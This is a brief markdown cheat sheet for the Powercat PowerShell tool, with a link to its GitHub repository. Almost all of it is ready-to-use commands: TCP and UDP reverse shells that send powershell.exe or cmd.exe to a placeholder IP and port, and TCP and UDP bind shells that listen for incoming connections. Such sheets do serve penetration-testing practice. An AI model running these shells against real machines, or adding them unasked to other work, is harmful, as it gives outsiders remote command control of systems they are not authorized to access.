# Powercat

## 01 - Reverse shell

### 1.1 - TCP Method

```
PS C:\> powercat -c <IP> -p <PORT> -e <powershell.exe | cmd.exe>
```

### 1.2 - UDP Method

```
PS C:\> powercat -u -c <IP> -p <PORT> -e <powershell.exe | cmd.exe>
```

## 02 - Bind shell

### 2.1 - TCP Method

```
PS C:\> powercat -l -p <PORT> -e <powershell.exe | cmd.exe>
```

### 2.2 - UDP Method

```
PS C:\> powercat -u -l -p <PORT> -e <powershell.exe | cmd.exe>
```

---
## References

- [besimorhino: Powercat](https://github.com/besimorhino/powercat)